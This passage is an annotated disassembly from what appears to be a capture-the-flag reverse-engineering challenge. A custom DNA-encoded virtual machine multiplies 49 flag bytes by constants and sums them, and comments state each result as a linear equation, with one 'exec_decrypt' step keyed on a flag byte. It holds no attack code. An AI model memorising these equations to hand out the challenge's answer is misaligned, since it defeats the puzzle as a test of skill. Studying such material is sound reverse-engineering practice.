TCGTCTTCCCCC     push(mem[#028b])\n07296 : CCTTCTCCCCCC     push(#0000008a)\n072a2 : TA               push(pop() * pop())\n072a4 : TCCGCTTCCCCC     push(mem[#028c])\n072b0 : CCTTACCCCCCC     push(#0000001a)\n072bc : TA               push(pop() * pop())\n072be : TCAGCTTCCCCC     push(mem[#028d])\n072ca : CCGTGACCCCCC     push(#0000007b)\n072d6 : TA               push(pop() * pop())\n072d8 : TCTGCTTCCCCC     push(mem[#028e])\n072e4 : CCCCCCCCCCCC     push(#00000000)\n072f0 : TA               push(pop() * pop())\n072f2 : TCGGCTTCCCCC     push(mem[#028f])\n072fe : CCGGGACCCCCC     push(#0000007f)\n0730a : TA               push(pop() * pop())\n0730c : TCCCATTCCCCC     push(mem[#0290])\n07318 : CCACGACCCCCC     push(#00000071)\n07324 : TA               push(pop() * pop())\n07326 : TCACATTCCCCC     push(mem[#0291])\n07332 : CCAAGGCCCCCC     push(#000000f5)\n0733e : TA               push(pop() * pop())\n07340 : TCTCATTCCCCC     push(mem[#0292])\n0734c : CCCGTCCCCCCC     push(#0000002c)\n07358 : TA               push(pop() * pop())\n0735a : TCGCATTCCCCC     push(mem[#0293])\n07366 : CCTGCCCCCCCC     push(#0000000e)\n07372 : TA               push(pop() * pop())\n07374 : TCCAATTCCCCC     push(mem[#0294])\n07380 : CCGCCACCCCCC     push(#00000043)\n0738c : TA               push(pop() * pop())\n0738e : TCAAATTCCCCC     push(mem[#0295])\n0739a : CCCAGCCCCCCC     push(#00000034)\n073a6 : TA               push(pop() * pop())\n073a8 : TCTAATTCCCCC     push(mem[#0296])\n073b4 : CCAATTCCCCCC     push(#000000a5)\n073c0 : TA               push(pop() * pop())\n073c2 : TCGAATTCCCCC     push(mem[#0297])\n073ce : CCCCTGCCCCCC     push(#000000e0)\n073da : TA               push(pop() * pop())\n073dc : TCCTATTCCCCC     push(mem[#0298])\n073e8 : CCCGGGCCCCCC     push(#000000fc)\n073f4 : TA               push(pop() * pop())\n073f6 : TCATATTCCCCC     push(mem[#0299])\n07402 : CCTCAACCCCCC     push(#00000052)\n0740e : TA               push(pop() * pop())\n07410 : TCTTATTCCCCC     push(mem[#029a])\n0741c : CCCGACCCCCCC     push(#0000001c)\n07428 : TA               push(pop() * pop())\n0742a : TCGTATTCCCCC     push(mem[#029b])\n07436 : CCTGTACCCCCC     push(#0000006e)\n07442 : TA               push(pop() * pop())\n07444 : TCCGATTCCCCC     push(mem[#029c])\n07450 : CCTAGCCCCCCC     push(#00000036)\n0745c : TA               push(pop() * pop())\n0745e : TCAGATTCCCCC     push(mem[#029d])\n0746a : CCTTGACCCCCC     push(#0000007a)\n07476 : TA               push(pop() * pop())\n07478 : TCTGATTCCCCC     push(mem[#029e])\n07484 : CCACCCCCCCCC     push(#00000001)\n07490 : TA               push(pop() * pop())\n07492 : TCGGATTCCCCC     push(mem[#029f])\n0749e : CCTGACCCCCCC     push(#0000001e)\n074aa : TA               push(pop() * pop())\n074ac : TCCCTTTCCCCC     push(mem[#02a0])\n074b8 : CCGAGTCCCCCC     push(#000000b7)\n074c4 : TA               push(pop() * pop())\n074c6 : TCACTTTCCCCC     push(mem[#02a1])\n074d2 : CCCTTACCCCCC     push(#00000068)\n074de : TA               push(pop() * pop())\n074e0 : TCTCTTTCCCCC     push(mem[#02a2])\n074ec : CCTGCGCCCCCC     push(#000000ce)\n074f8 : TA               push(pop() * pop())\n074fa : TCGCTTTCCCCC     push(mem[#02a3])\n07506 : CCTGTCCCCCCC     push(#0000002e)\n07512 : TA               push(pop() * pop())\n07514 : TCCATTTCCCCC     push(mem[#02a4])\n07520 : CCCTCCCCCCCC     push(#00000008)\n0752c : TA               push(pop() * pop())\n0752e : TCAATTTCCCCC     push(mem[#02a5])\n0753a : CCGGCGCCCCCC     push(#000000cf)\n07546 : TA               push(pop() * pop())\n07548 : TCTATTTCCCCC     push(mem[#02a6])\n07554 : CCGAGTCCCCCC     push(#000000b7)\n07560 : TA               push(pop() * pop())\n07562 : TCGATTTCCCCC     push(mem[#02a7])\n0756e : CCTTCTCCCCCC     push(#0000008a)\n0757a : TA               push(pop() * pop())\n0757c : TCCTTTTCCCCC     push(mem[#02a8])\n07588 : CCTAGTCCCCCC     push(#000000b6)\n07594 : TA               push(pop() * pop())\n07596 : TCATTTTCCCCC     push(mem[#02a9])\n075a2 : CCAAGACCCCCC     push(#00000075)\n075ae : TA               push(pop() * pop())\n075b0 : TCTTTTTCCCCC     push(mem[#02aa])\n075bc : CCCGATCCCCCC     push(#0000009c)\n075c8 : TA               push(pop() * pop())\n075ca : TCGTTTTCCCCC     push(mem[#02ab])\n075d6 : CCTGTACCCCCC     push(#0000006e)\n075e2 : TA               push(pop() * pop())\n075e4 : TCCGTTTCCCCC     push(mem[#02ac])\n075f0 : CCCCCTCCCCCC     push(#00000080)\n075fc : TA               push(pop() * pop())\n075fe : TCAGTTTCCCCC     push(mem[#02ad])\n0760a : CCAGATCCCCCC     push(#0000009d)\n07616 : TA               push(pop() * pop())\n07618 : TCTGTTTCCCCC     push(mem[#02ae])\n07624 : CCGTTTCCCCCC     push(#000000ab)\n07630 : TA               push(pop() * pop())\n07632 : TCGGTTTCCCCC     push(mem[#02af])\n0763e : CCGACCCCCCCC     push(#00000007)\n0764a : TA               push(pop() * pop())\n0764c : TCCCGTTCCCCC     push(mem[#02b0])\n07658 : CCGTAACCCCCC     push(#0000005b)\n07664 : TA               push(pop() * pop())\n07666 : CA               push(pop() + pop())\n07668 : CA               push(pop() + pop())\n0766a : CA               push(pop() + pop())\n0766c : CA               push(pop() + pop())\n0766e : CA               push(pop() + pop())\n07670 : CA               push(pop() + pop())\n07672 : CA               push(pop() + pop())\n07674 : CA               push(pop() + pop())\n07676 : CA               push(pop() + pop())\n07678 : CA               push(pop() + pop())\n0767a : CA               push(pop() + pop())\n0767c : CA               push(pop() + pop())\n0767e : CA               push(pop() + pop())\n07680 : CA               push(pop() + pop())\n07682 : CA               push(pop() + pop())\n07684 : CA               push(pop() + pop())\n07686 : CA               push(pop() + pop())\n07688 : CA               push(pop() + pop())\n0768a : CA               push(pop() + pop())\n0768c : CA               push(pop() + pop())\n0768e : CA               push(pop() + pop())\n07690 : CA               push(pop() + pop())\n07692 : CA               push(pop() + pop())\n07694 : CA               push(pop() + pop())\n07696 : CA               push(pop() + pop())\n07698 : CA               push(pop() + pop())\n0769a : CA               push(pop() + pop())\n0769c : CA               push(pop() + pop())\n0769e : CA               push(pop() + pop())\n076a0 : CA               push(pop() + pop())\n076a2 : CA               push(pop() + pop())\n076a4 : CA               push(pop() + pop())\n076a6 : CA               push(pop() + pop())\n076a8 : CA               push(pop() + pop())\n076aa : CA               push(pop() + pop())\n076ac : CA               push(pop() + pop())\n076ae : CA               push(pop() + pop())\n076b0 : CA               push(pop() + pop())\n076b2 : CA               push(pop() + pop())\n076b4 : CA               push(pop() + pop())\n076b6 : CA               push(pop() + pop())\n076b8 : CA               push(pop() + pop())\n076ba : CA               push(pop() + pop())\n076bc : CA               push(pop() + pop())\n076be : CA               push(pop() + pop())\n076c0 : CA               push(pop() + pop())\n076c2 : CA               push(pop() + pop())\n076c4 : CA               push(pop() + pop())\n076c6 : GCCAAACCACCC     mem[#1054] := pop()           memory[#01054] := ((flag[0] * 248) + ((flag[1] * 69) + ((flag[2] * 173) + ((flag[3] * 169) + ((flag[4] * 88) + ((flag[5] * 169) + ((flag[6] * 73) + ((flag[7] * 188) + ((flag[8] * 107) + ((flag[9] * 110) + ((flag[10] * 150) + ((flag[11] * 138) + ((flag[12] * 26) + ((flag[13] * 123) + ((flag[14] * 0) + ((flag[15] * 127) + ((flag[16] * 113) + ((flag[17] * 245) + ((flag[18] * 44) + ((flag[19] * 14) + ((flag[20] * 67) + ((flag[21] * 52) + ((flag[22] * 165) + ((flag[23] * 224) + ((flag[24] * 252) + ((flag[25] * 82) + ((flag[26] * 28) + ((flag[27] * 110) + ((flag[28] * 54) + ((flag[29] * 122) + ((flag[30] * 1) + ((flag[31] * 30) + ((flag[32] * 183) + ((flag[33] * 104) + ((flag[34] * 206) + ((flag[35] * 46) + ((flag[36] * 8) + ((flag[37] * 207) + ((flag[38] * 183) + ((flag[39] * 138) + ((flag[40] * 182) + ((flag[41] * 117) + ((flag[42] * 156) + ((flag[43] * 110) + ((flag[44] * 128) + ((flag[45] * 157) + ((flag[46] * 171) + ((flag[47] * 7) + (flag[48] * 91)))))))))))))))))))))))))))))))))))))))))))))))))\n076d2 : TCGTATTCCCCC     push(mem[#029b])\n076de : AG               exec(pop())                   exec_decrypt(flag[27])\n      ; section at 076e0, coding: [3, 0, 2, 1]\n076e0 : GTTTTGGTTTTT     push(mem[#0280])\n076ec : TTTGTTTTTTTT     push(#00000008)\n076f8 : GC               push(pop() * pop())\n076fa : GTCTTGGTTTTT     push(mem[#0281])\n07706 : TTTACGTTTTTT     push(#0000009c)\n07712 : GC               push(pop() * pop())\n07714 : GTGTTGGTTTTT     push(mem[#0282])\n07720 : TTCCTCTTTTTT     push(#00000045)\n0772c : GC               push(pop() * pop())\n0772e : GTATTGGTTTTT     push(mem[#0283])\n0773a : TTCGCTTTTTTT     push(#00000019)\n07746 : GC               push(pop() * pop())\n07748 : GTTCTGGTTTTT     push(mem[#0284])\n07754 : TTTAGATTTTTT     push(#000000ec)\n07760 : GC               push(pop() * pop())\n07762 : GTCCTGGTTTTT     push(mem[#0285])\n0776e : TTTCTCTTTTTT     push(#00000044)\n0777a : GC               push(pop() * pop())\n0777c : GTGCTGGTTTTT     push(mem[#0286])\n07788 : TTTAATTTTTTT     push(#0000003c)\n07794 : GC               push(pop() * pop())\n07796 : GTACTGGTTTTT     push(mem[#0287])\n077a2 : TTCCCATTTTTT     push(#000000d5)\n077ae : GC               push(pop() * pop())\n077b0 : GTTGTGGTTTTT     push(mem[#0288])\n077bc : TTTCTTTTTTTT     push(#00000004)\n077c8 : GC               push(pop() * pop())\n077ca : GTCGTGGTTTTT     push(mem[#0289])\n077d6 : TTTAGGTTTTTT     push(#000000ac)\n077e2 : GC               push(pop() * pop())\n077e4 : GTGGTGGTTTTT     push(mem[#028a])\n077f0 : TTAACCTTTTTT     push(#0000005f)\n077fc : GC               push(pop() * pop())\n077fe : GTAGTGGTTTTT     push(mem[#028b])\n0780a : TTAGCTTTTTTT     push(#0000001b)\n07816 : GC               push(pop() * pop())\n07818 : GTTATGGTTTTT     push(mem[#028c])\n07824 : TTCCTTTTTTTT     push(#00000005)\n07830 : GC               push(pop() * pop())\n07832 : GTCATGGTTTTT     push(mem[#028d])\n0783e : TTTAACTTTTTT     push(#0000007c)\n0784a : GC               push(pop() * pop())\n0784c : GTGATGGTTTTT     push(mem[#028e])\n07858 : TTAGTATTTTTT     push(#000000cb)\n07864 : GC               push(pop() * pop())\n07866 : GTAATGGTTTTT     push(mem[#028f])\n07872 : TTACATTTTTTT     push(#00000037)\n0787e : GC               push(pop() * pop())\n07880 : GTTTCGGTTTTT     push(mem[#0290])\n0788c : TTAAGCTTTTTT     push(#0000006f)\n07898 : GC               push(pop() * pop())\n0789a : GTCTCGGTTTTT     push(mem[#0291])\n078a6 : TTCCGATTTTTT     push(#000000e5)\n078b2 : GC               push(pop() * pop())\n078b4 : GTGTCGGTTTTT     push(mem[#0292])\n078c0 : TTCCTGTTTTTT     push(#00000085)\n078cc : GC               push(pop() * pop())\n078ce : GTATCGGTTTTT     push(mem[#0293])\n078da : TTGTGCTTTTTT     push(#00000062)\n078e6 : GC               push(pop() * pop())\n078e8 : GTTCCGGTTTTT     push(mem[#0294])\n078f4 : TTAGGCTTTTTT     push(#0000006b)\n07900 : GC               push(pop() * pop())\n07902 : GTCCCGGTTTTT     push(mem[#0295])\n0790e : TTTGACTTTTTT     push(#00000078)\n0791a : GC               push(pop() * pop())\n0791c : GTGCCGGTTTTT     push(mem[#0296])\n07928 : TTTGGTTTTTTT     push(#00000028)\n07934 : GC               push(pop() * pop())\n07936 : GTACCGGTTTTT     push(mem[#0297])\n07942 : TTTACGTTTTTT     push(#0000009c)\n0794e : GC               push(pop() * pop())\n07950 : GTTGCGGTTTTT     push(mem[#0298])\n0795c : TTAACCTTTTTT     push(#0000005f)\n07968 : GC               push(pop() * pop())\n0796a : GTCGCGGTTTTT     push(mem[#0299])\n07976 : TTATACTTTTTT     push(#00000073)\n07982 : GC               push(pop() * pop())\n07984 : GTGGCGGTTTTT     push(mem[#029a])\n07990 : TTTCAGTTTTTT     push(#000000b4)\n0799c : GC               push(pop() * pop())\n0799e : GTAGCGGTTTTT     push(mem[#029b])\n079aa : TTTTCATTTTTT     push(#000000d0)\n079b6 : GC               push(pop() * pop())\n079b8 : GTTACGGTTTTT     push(mem[#029c])\n079c4 : TTGGGCTTTTTT     push(#0000006a)\n079d0 : GC               push(pop() * pop())\n079d2 : GTCACGGTTTTT     push(mem[#029d])\n079de : TTAGATTTTTTT     push(#0000003b)\n079ea : GC               push(pop() * pop())\n079ec : GTGACGGTTTTT     push(mem[#029e])\n079f8 : TTAAGTTTTTTT     push(#0000002f)\n07a04 : GC               push(pop() * pop())\n07a06 : GTAACGGTTTTT     push(mem[#029f])\n07a12 : TTCGATTTTTTT     push(#00000039)\n07a1e : GC               push(pop() * pop())\n07a20 : GTTTGGGTTTTT     push(mem[#02a0])\n07a2c : TTTGGCTTTTTT     push(#00000068)\n07a38 : GC               push(pop() * pop())\n07a3a : GTCTGGGTTTTT     push(mem[#02a1])\n07a46 : TTCACTTTTTTT     push(#0000001d)\n07a52 : GC               push(pop() * pop())\n07a54 : GTGTGGGTTTTT     push(mem[#02a2])\n07a60 : TTCCATTTTTTT     push(#00000035)\n07a6c : GC               push(pop() * pop())\n07a6e : GTATGGGTTTTT     push(mem[#02a3])\n07a7a : TTGCGGTTTTTT     push(#000000a6)\n07a86 : GC               push(pop() * pop())\n07a88 : GTTCGGGTTTTT     push(mem[#02a4])\n07a94 : TTTATATTTTTT     push(#000000cc)\n07aa0 : GC               push(pop() * pop())\n07aa2 : GTCCGGGTTTTT     push(mem[#02a5])\n07aae : TTTGACTTTTTT     push(#00000078)\n07aba : GC               push(pop() * pop())\n07abc : GTGCGGGTTTTT     push(mem[#02a6])\n07ac8 : TTGGAGTTTTTT     push(#000000ba)\n07ad4 : GC               push(pop() * pop())\n07ad6 : GTACGGGTTTTT     push(mem[#02a7])\n07ae2 : TTTTACTTTTTT     push(#00000070)\n07aee : GC               push(pop() * pop())\n07af0 : GTTGGGGTTTTT     push(mem[#02a8])\n07afc : TTGCCCTTTTTT     push(#00000056)\n07b08 : GC               push(pop() * pop())\n07b0a : GTCGGGGTTTTT     push(mem[#02a9])\n07b16 : TTCCCCTTTTTT     push(#00000055)\n07b22 : GC               push(pop() * pop())\n07b24 : GTGGGGGTTTTT     push(mem[#02aa])\n07b30 : TTGGCGTTTTTT     push(#0000009a)\n07b3c : GC               push(pop() * pop())\n07b3e : GTAGGGGTTTTT     push(mem[#02ab])\n07b4a : TTCATCTTTTTT     push(#0000004d)\n07b56 : GC               push(pop() * pop())\n07b58 : GTTAGGGTTTTT     push(mem[#02ac])\n07b64 : TTGCGGTTTTTT     push(#000000a6)\n07b70 : GC               push(pop() * pop())\n07b72 : GTCAGGGTTTTT     push(mem[#02ad])\n07b7e : TTATCATTTTTT     push(#000000d3)\n07b8a : GC               push(pop() * pop())\n07b8c : GTGAGGGTTTTT     push(mem[#02ae])\n07b98 : TTTGACTTTTTT     push(#00000078)\n07ba4 : GC               push(pop() * pop())\n07ba6 : GTAAGGGTTTTT     push(mem[#02af])\n07bb2 : TTAGCATTTTTT     push(#000000db)\n07bbe : GC               push(pop() * pop())\n07bc0 : GTTTAGGTTTTT     push(mem[#02b0])\n07bcc : TTGCACTTTTTT     push(#00000076)\n07bd8 : GC               push(pop() * pop())\n07bda : TC               push(pop() + pop())\n07bdc : TC               push(pop() + pop())\n07bde : TC               push(pop() + pop())\n07be0 : TC               push(pop() + pop())\n07be2 : TC               push(pop() + pop())\n07be4 : TC               push(pop() + pop())\n07be6 : TC               push(pop() + pop())\n07be8 : TC               push(pop() + pop())\n07bea : TC               push(pop() + pop())\n07bec : TC               push(pop() + pop())\n07bee : TC               push(pop() + pop())\n07bf0 : TC               push(pop() + pop())\n07bf2 : TC               push(pop() + pop())\n07bf4 : TC               push(pop() + pop())\n07bf6 : TC               push(pop() + pop())\n07bf8 : TC               push(pop() + pop())\n07bfa : TC               push(pop() + pop())\n07bfc : TC               push(pop() + pop())\n07bfe : TC               push(pop() + pop())\n07c00 : TC               push(pop() + pop())\n07c02 : TC               push(pop() + pop())\n07c04 : TC               push(pop() + pop())\n07c06 : TC               push(pop() + pop())\n07c08 : TC               push(pop() + pop())\n07c0a : TC               push(pop() + pop())\n07c0c : TC               push(pop() + pop())\n07c0e : TC               push(pop() + pop())\n07c10 : TC               push(pop() + pop())\n07c12 : TC               push(pop() + pop())\n07c14 : TC               push(pop() + pop())\n07c16 : TC               push(pop() + pop())\n07c18 : TC               push(pop() + pop())\n07c1a : TC               push(pop() + pop())\n07c1c : TC               push(pop() + pop())\n07c1e : TC               push(pop() + pop())\n07c20 : TC               push(pop() + pop())\n07c22 : TC               push(pop() + pop())\n07c24 : TC               push(pop() + pop())\n07c26 : TC               push(pop() + pop())\n07c28 : TC               push(pop() + pop())\n07c2a : TC               push(pop() + pop())\n07c2c : TC               push(pop() + pop())\n07c2e : TC               push(pop() + pop())\n07c30 : TC               push(pop() + pop())\n07c32 : TC               push(pop() + pop())\n07c34 : TC               push(pop() + pop())\n07c36 : TC               push(pop() + pop())\n07c38 : TC               push(pop() + pop())\n07c3a : ATTGCCTTCTTT     mem[#1058] := pop()           memory[#01058] := ((flag[0] * 8) + ((flag[1] * 156) + ((flag[2] * 69) + ((flag[3] * 25) + ((flag[4] * 236) + ((flag[5] * 68) + ((flag[6] * 60) + ((flag[7] * 213) + ((flag[8] * 4) + ((flag[9] * 172) + ((flag[10] * 95) + ((flag[11] * 27) + ((flag[12] * 5) + ((flag[13] * 124) + ((flag[14] * 203) + ((flag[15] * 55) + ((flag[16] * 111) + ((flag[17] * 229) + ((flag[18] * 133) + ((flag[19] * 98) + ((flag[20] * 107) + ((flag[21] * 120) + ((flag[22] * 40) + ((flag[23] * 156) + ((flag[24] * 95) + ((flag[25] * 115) + ((flag[26] * 180) + ((flag[27] * 208) + ((flag[28] * 106) + ((flag[29] * 59) + ((flag[30] * 47) + ((flag[31] * 57) + ((flag[32] * 104) + ((flag[33] * 29) + ((flag[34] * 53) + ((flag[35] * 166) + ((flag[36] * 204) + ((flag[37] * 120) + ((flag[38] * 186) + ((flag[39] * 112) + ((flag[40] * 86) + ((flag[41] * 85) + ((flag[42] * 154) + ((flag[43] * 77) + ((flag[44] * 166) + ((flag[45] * 211) + ((flag[46] * 120) + ((flag[47] * 219) + (flag[48] * 118)))))))))))))))))))))))))))))))))))))))))))))))))\n07c46 : GTTTTGGTTTTT     push(mem[#0280])\n07c52 : TTGTGATTTTTT     push(#000000e2)\n07c5e : GC               push(pop() * pop())\n07c60 : GTCTTGGTTTTT     push(mem[#0281])\n07c6c : TTAATGTTTTTT     push(#0000008f)\n07c78 : GC               push(pop() * pop())\n07c7a : GTGTTGGTTTTT     push(mem[#0282])\n07c86 : TTGAGGTTTTTT     push(#000000ae)\n07c92 : GC               push(pop() * pop())\n07c94 : GTATTGGTTTTT     push(mem[#0283])\n07ca0 : TTGGTATTTTTT     push(#000000ca)\n07cac : GC               push(pop() * pop())\n07cae : GTTCTGGTTTTT     push(mem[#0284])\n07cba : TTCAGATTTTTT     push(#000000ed)\n07cc6 : GC               push(pop() * pop())\n07cc8 : GTCCTGGTTTTT     push(mem[#0285])\n07cd4 : TTGTGATTTTTT     push(#000000e2)\n07ce0 : GC               push(pop() * pop())\n07ce2 : GTGCTGGTTTTT     push(mem[#0286])\n07cee : TTGGGTTTTTTT     push(#0000002a)\n07cfa : GC               push(pop() * pop())\n07cfc : GTACTGGTTTTT     push(mem[#0287])\n07d08 : TTCCGCTTTTTT     push(#00000065)\n07d14 : GC               push(pop() * pop())\n07d16 : GTTGTGGTTTTT     push(mem[#0288])\n07d22 : TTAATCTTTTTT     push(#0000004f)\n07d2e : GC               push(pop() * pop())\n07d30 : GTCGTGGTTTTT     push(mem[#0289])\n07d3c : TTCTCCTTTTTT     push(#00000051)\n07d48 : GC               push(pop() * pop())\n07d4a : GTGGTGGTTTTT     push(mem[#028a])\n07d56 : TTCCCATTTTTT     push(#000000d5)\n07d62 : GC               push(pop() * pop())\n07d64 : GTAGTGGTTTTT     push(mem[#028b])\n07d70 : TTGAGCTTTTTT     push(#0000006e)\n07d7c : GC               push(pop() * pop())\n07d7e : GTTATGGTTTTT     push(mem[#028c])\n07d8a : TTTCAGTTTTTT     push(#000000b4)\n07d96 : GC               push(pop() * pop())\n07d98 : GTCATGGTTTTT     push(mem[#028d])\n07da4 : TTCTCCTTTTTT     push(#00000051)\n07db0 : GC               push(pop() * pop())\n07db2 : GTGATGGTTTTT     push(mem[#028e])\n07dbe : TTGCGTTTTTTT     push(#00000026)\n07dca : GC               push(pop() * pop())\n07dcc : GTAATGGTTTTT     push(mem[#028f])\n07dd8 : TTTGGCTTTTTT     push(#00000068)\n07de4 : GC               push(pop() * pop())\n07de6 : GTTTCGGTTTTT     push(mem[#0290])\n07df2 : TTTGCTTTTTTT     push(#00000018)\n07dfe : GC               push(pop() * pop())\n07e00 : GTCTCGGTTTTT     push(mem[#0291])\n07e0c : TTCGCCTTTTTT     push(#00000059)\n07e18 : GC               push(pop() * pop())\n07e1a : GTGTCGGTTTTT     push(mem[#0292])\n07e26 : TTTTACTTTTTT     push(#00000070)\n07e32 : GC               push(pop() * pop())\n07e34 : GTATCGGTTTTT     push(mem[#0293])\n07e40 : TTCTAGTTTTTT     push(#000000b1)\n07e4c : GC               push(pop() * pop())\n07e4e : GTTCCGGTTTTT     push(mem[#0294])\n07e5a : TTCTGGTTTTTT     push(#000000a1)\n07e66 : GC               push(pop() * pop())\n07e68 : GTCCCGGTTTTT     push(mem[#0295])\n07e74 : TTCGACTTTTTT     push(#00000079)\n07e80 : GC               push(pop() * pop())\n07e82 : GTGCCGGTTTTT     push(mem[#0296])\n07e8e : TTCTCCTTTTTT     push(#00000051)\n07e9a : GC               push(pop() * pop())\n07e9c : GTACCGGTTTTT     push(mem[#0297])\n07ea8 : TTGTGTTTTTTT     push(#00000022)\n07eb4 : GC               push(pop() * pop())\n07eb6 : GTTGCGGTTTTT     push(mem[#0298])\n07ec2 : TTCTCCTTTTTT     push(#00000051)\n07ece : GC               push(pop() * pop())\n07ed0 : GTCGCGGTTTTT     push(mem[#0299])\n07edc : TTTCTATTTTTT     push(#000000c4)\n07ee8 : GC               push(pop() * pop())\n07eea : GTGGCGGTTTTT     push(mem[#029a])\n07ef6 : TTAGTCTTTTTT     push(#0000004b)\n07f02 : GC               push(pop() * pop())\n07f04 : GTAGCGGTTTTT     push(mem[#029b])\n07f10 : TTATTTTTTTTT     push(#00000003)\n07f1c : GC               push(pop() * pop())\n07f1e : GTTACGGTTTTT     push(mem[#029c])\n07f2a : TTGAGCTTTTTT     push(#0000006e)\n07f36 : GC               push(pop() * pop())\n07f38 : GTCACGGTTTTT     push(mem[#029d])\n07f44 : TTGCTGTTTTTT     push(#00000086)\n07f50 : GC               push(pop() * pop())\n07f52 : GTGACGGTTTTT     push(mem[#029e])\n07f5e : TTGGCATTTTTT     push(#000000da)\n07f6a : GC               push(pop() * pop())\n07f6c : GTAACGGTTTTT     push(mem[#029f])\n07f78 : TTTGGCTTTTTT     push(#00000068)\n07f84 : GC               push(pop() * pop())\n07f86 : GTTTGGGTTTTT     push(mem[#02a0])\n07f92 : TTGTAATTTTTT     push(#000000f2)\n07f9e : GC               push(pop() * pop())\n07fa0 : GTCTGGGTTTTT     push(mem[#02a1])\n07fac : TTGTTGTTTTTT     push(#00000082)\n07fb8 : GC               push(pop() * pop())\n07fba : GTGTGGGTTTTT     push(mem[#02a2])\n07fc6 : TTTATGTTTTTT     push(#0000008c)\n07fd2 : GC               push(pop() * pop())\n07fd4 : GTATGGGTTTTT     push(mem[#02a3])\n07fe0 : TTGCGTTTTTTT     push(#00000026)\n07fec : GC               push(pop() * pop())\n07fee : GTTCGGGTTTTT     push(mem[#02a4])\n07ffa : TTCTATTTTTTT     push(#00000031)\n08006 : GC               push(pop() * pop())\n08008 : GTCCGGGTTTTT     push(mem[#02a5])\n08014 : TTAGTCTTTTTT     push(#0000004b)\n08020 : GC               push(pop() * pop())\n08022 : GTGCGGGTTTTT     push(mem[#02a6])\n0802e : TTAGTGTTTTTT     push(#0000008b)\n0803a : GC               push(pop() * pop())\n0803c : GTACGGGTTTTT     push(mem[#02a7])\n08048 : TTGAATTTTTTT     push(#0000003e)\n08054 : GC               push(pop() * pop())\n08056 : GTTGGGGTTTTT     push(mem[#02a8])\n08062 : TTGAGCTTTTTT     push(#0000006e)\n0806e : GC               push(pop() * pop())\n08070 : GTCGGGGTTTTT     push(mem[#02a9])\n0807c : TTTAGGTTTTTT     push(#000000ac)\n08088 : GC               push(pop() * pop())\n0808a : GTGGGGGTTTTT     push(mem[#02aa])\n08096 : TTGGGCTTTTTT     push(#0000006a)\n080a2 : GC               push(pop() * pop())\n080a4 : GTAGGGGTTTTT     push(mem[#02ab])\n080b0 : TTGCCCTTTTTT     push(#00000056)\n080bc : GC               push(pop() * pop())\n080be : GTTAGGGTTTTT     push(mem[#02ac])\n080ca : TTGATGTTTTTT     push(#0000008e)\n080d6 : GC               push(pop() * pop())\n080d8 : GTCAGGGTTTTT     push(mem[#02ad])\n080e4 : TTCATCTTTTTT     push(#0000004d)\n080f0 : GC               push(pop() * pop())\n080f2 : GTGAGGGTTTTT     push(mem[#02ae])\n080fe : TTACGGTTTTTT     push(#000000a7)\n0810a : GC               push(pop() * pop())\n0810c : GTAAGGGTTTTT     push(mem[#02af])\n08118 : TTCGGCTTTTTT     push(#00000069)\n08124 : GC               push(pop() * pop())\n08126 : GTTTAGGTTTTT     push(mem[#02b0])\n08132 : TTCGGCTTTTTT     push(#00000069)\n0813e : GC               push(pop() * pop())\n08140 : TC               push(pop() + pop())\n08142 : TC               push(pop() + pop())\n08144 : TC               push(pop() + pop())\n08146 : TC               push(pop() + pop())\n08148 : TC               push(pop() + pop())\n0814a : TC               push(pop() + pop())\n0814c : TC               push(pop() + pop())\n0814e : TC               push(pop() + pop())\n08150 : TC               push(pop() + pop())\n08152 : TC               push(pop() + pop())\n08154 : TC               push(pop() + pop())\n08156 : TC               push(pop() + pop())\n08158 : TC               push(pop() + pop())\n0815a : TC               push(pop() + pop())\n0815c : TC               push(pop() + pop())\n0815e : TC               push(pop() + pop())\n08160 : TC               push(pop() + pop())\n08162 : TC               push(pop() + pop())\n08164 : TC               push(pop() + pop())\n08166 : TC               push(pop() + pop())\n08168 : TC               push(pop() + pop())\n0816a : TC               push(pop() + pop())\n0816c : TC               push(pop() + pop())\n0816e : TC               push(pop() + pop())\n08170 : TC               push(pop() + pop())\n08172 : TC               push(pop() + pop())\n08174 : TC               push(pop() + pop())\n08176 : TC               push(pop() + pop())\n08178 : TC               push(pop() + pop())\n0817a : TC               push(pop() + pop())\n0817c : TC               push(pop() + pop())\n0817e : TC               push(pop() + pop())\n08180 : TC               push(pop() + pop())\n08182 : TC               push(pop() + pop())\n08184 : TC               push(pop() + pop())\n08186 : TC               push(pop() + pop())\n08188 : TC               push(pop() + pop())\n0818a : TC               push(pop() + pop())\n0818c : TC               push(pop() + pop())\n0818e : TC               push(pop() + pop())\n08190 : TC               push(pop() + pop())\n08192 : TC               push(pop() + pop())\n08194 : TC               push(pop() + pop())\n08196 : TC               push(pop() + pop())\n08198 : TC               push(pop() + pop())\n0819a : TC               push(pop() + pop())\n0819c : TC               push(pop() + pop())\n0819e : TC               push(pop() + pop())\n081a0 : ATTACCTTCTTT     mem[#105c] := pop()           memory[#0105c] := ((flag[0] * 226) + ((flag[1] * 143) + ((flag[2] * 174) + ((flag[3] * 202) + ((flag[4] * 237) + ((flag[5] * 226) + ((flag[6] * 42) + ((flag[7] * 101) + ((flag[8] * 79) + ((flag[9] * 81) + ((flag[10] * 213) + ((flag[11] * 110) + ((flag[12] * 180) + ((flag[13] * 81) + ((flag[14] * 38) + ((flag[15] * 104) + ((flag[16] * 24) + ((flag[17] * 89) + ((flag[18] * 112) + ((flag[19] * 177) + ((flag[20] * 161) + ((flag[21] * 121) + ((flag[22] * 81) + ((flag[23] * 34) + ((flag[24] * 81) + ((flag[25] * 196) + ((flag[26] * 75) + ((flag[27] * 3) + ((flag[28] * 110) + ((flag[29] * 134) + ((flag[30] * 218) + ((flag[31] * 104) + ((flag[32] * 242) + ((flag[33] * 130) + ((flag[34] * 140) + ((flag[35] * 38) + ((flag[36] * 49) + ((flag[37] * 75) + ((flag[38] * 139) + ((flag[39] * 62) + ((flag[40] * 110) + ((flag[41] * 172) + ((flag[42] * 106) + ((flag[43] * 86) + ((flag[44] * 142) + ((flag[45] * 77) + ((flag[46] * 167) + ((flag[47] * 105) + (flag[48] * 105)))))))))))))))))))))))))))))))))))))))))))))))))\n081ac : GTTTTGGTTTTT     push(mem[#0280])\n081b8 : TTTTCCTTTTTT     push(#00000050)\n081c4 : GC               push(pop() * pop())\n081c6 : GTCTTGGTTTTT     push(mem[#0281])\n081d2 : TTCTCTTTTTTT     push(#00000011)\n081de : GC               push(pop() * pop())\n081e0 : GTGTTGGTTTTT     push(mem[#0282])\n081ec : TTGTTCTTTTTT     push(#00000042)\n081f8 : GC               push(pop() * pop())\n081fa : GTATTGGTTTTT     push(mem[#0283])\n08206 : TTTCCATTTTTT     push(#000000d4)\n08212 : GC               push(pop() * 